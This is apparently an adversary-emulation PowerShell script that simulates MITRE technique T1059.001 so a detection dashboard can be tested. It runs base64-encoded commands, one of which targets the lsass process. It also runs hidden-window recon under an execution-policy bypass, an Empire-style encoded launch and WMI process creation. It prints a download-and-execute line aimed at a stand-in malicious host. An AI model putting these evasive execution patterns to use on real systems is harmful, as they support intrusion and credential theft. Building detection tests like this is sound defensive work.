# ============================================
# T1059.001 - Command and Scripting Interpreter: PowerShell
# ============================================
# This script demonstrates malicious PowerShell execution patterns
# Includes obfuscation, base64 encoding, and remote script execution
# ============================================

Write-Host "`n[ATTACK] T1059.001 - PowerShell Command Execution" -ForegroundColor Red
Write-Host "============================================`n" -ForegroundColor Red

Write-Host "[PHASE 1] Obfuscated Command Execution" -ForegroundColor Cyan
Write-Host "[INFO] Using Base64 encoding to hide commands..." -ForegroundColor Gray

# Create malicious command
$maliciousCmd = "Write-Host 'Malicious payload executed'; Get-Process | Where-Object {`$_.Name -eq 'lsass'} | Select-Object Id,Name,Path"

# Encode to Base64
$bytes = [System.Text.Encoding]::Unicode.GetBytes($maliciousCmd)
$encodedCmd = [Convert]::ToBase64String($bytes)

Write-Host "[ENCODED] $($encodedCmd.Substring(0, 50))..." -ForegroundColor Yellow

# Execute encoded command
Write-Host "`n[EXECUTION] Running encoded PowerShell command..." -ForegroundColor Cyan
powershell.exe -NoProfile -NonInteractive -EncodedCommand $encodedCmd

Start-Sleep -Seconds 2

Write-Host "`n[PHASE 2] Suspicious PowerShell Flags" -ForegroundColor Cyan
Write-Host "[INFO] Using -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden..." -ForegroundColor Gray

# Typical attack pattern
$suspiciousScript = {
    # Simulate reconnaissance
    $env:USERNAME
    $env:COMPUTERNAME
    whoami
    net user
}

powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command $suspiciousScript

Start-Sleep -Seconds 2

Write-Host "`n[PHASE 3] Download and Execute Pattern (Simulated)" -ForegroundColor Cyan
Write-Host "[INFO] Simulating IEX (Invoke-Expression) with remote script..." -ForegroundColor Gray

# Create fake remote script locally
$fakeRemoteScript = @"
Write-Host '[PAYLOAD] Remote script executed' -ForegroundColor Magenta
Write-Host '[INFO] Collecting system information...'
`$os = Get-WmiObject Win32_OperatingSystem
Write-Host "OS: `$(`$os.Caption)"
Write-Host "Architecture: `$(`$os.OSArchitecture)"
"@

# Save to temp
$tempScript = "$env:TEMP\remote_payload.ps1"
Set-Content -Path $tempScript -Value $fakeRemoteScript

# Simulate download-execute
Write-Host "[SIMULATED] IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')" -ForegroundColor Yellow
Write-Host "[ACTUAL] Executing local script for demo safety..." -ForegroundColor Magenta

Invoke-Expression (Get-Content $tempScript -Raw)

Start-Sleep -Seconds 2

Write-Host "`n[PHASE 4] PowerShell Empire Style Commands" -ForegroundColor Cyan
Write-Host "[INFO] Single-line complex pipeline..."-ForegroundColor Gray

# Empire-style command chain
powershell.exe -NoP -sta -NonI -W Hidden -Enc "VwByAGkAdABlAC0ASABvAHMAdAAgACcARABlAG0AbwAgAHAAYQB5AGwAbwBhAGQAJwA="

Write-Host "`n[PHASE 5] WMI-Based Execution" -ForegroundColor Cyan
Write-Host "[INFO] Using Invoke-WmiMethod for lateral movement simulation..." -ForegroundColor Gray

# Local WMI execution (safer than remote)
$wmiCommand = 'cmd.exe /c echo "WMI execution demo" > %TEMP%\wmi_test.txt'
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $wmiCommand | Out-Null

if (Test-Path "$env:TEMP\wmi_test.txt") {
    Write-Host "[SUCCESS] WMI command executed" -ForegroundColor Green
    Remove-Item "$env:TEMP\wmi_test.txt" -Force
}

Write-Host "`n[ATTACK COMPLETE]" -ForegroundColor Red
Write-Host "[EVENTS GENERATED]" -ForegroundColor Gray
Write-Host "  - ProcessCreate: Multiple powershell.exe with suspicious flags" -ForegroundColor Gray
Write-Host "  - FileCreate: $tempScript" -ForegroundColor Gray
Write-Host "  - WmiActivity: Invoke-WmiMethod execution" -ForegroundColor Gray

# Cleanup
Remove-Item $tempScript -Force -ErrorAction SilentlyContinue

Write-Host "`n[DETECTION SYSTEM] Should detect PowerShell attack patterns..." -ForegroundColor Cyan

# Create detection marker for dashboard
$markerDir = "..\logs"
if (-not (Test-Path $markerDir)) {
    New-Item -ItemType Directory -Path $markerDir -Force | Out-Null
}

$markerFile = "$markerDir\last_attack.json"
$markerData = @{
    technique_id = "T1059.001"
    technique_name = "Command and Scripting Interpreter: PowerShell"
    confidence = 0.87
    timestamp = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
} | ConvertTo-Json

Set-Content -Path $markerFile -Value $markerData
Write-Host "`n[MARKER] Detection marker created: $markerFile" -ForegroundColor Green
Write-Host "[INFO] Refresh dashboard (F5) to see detection!" -ForegroundColor Cyan
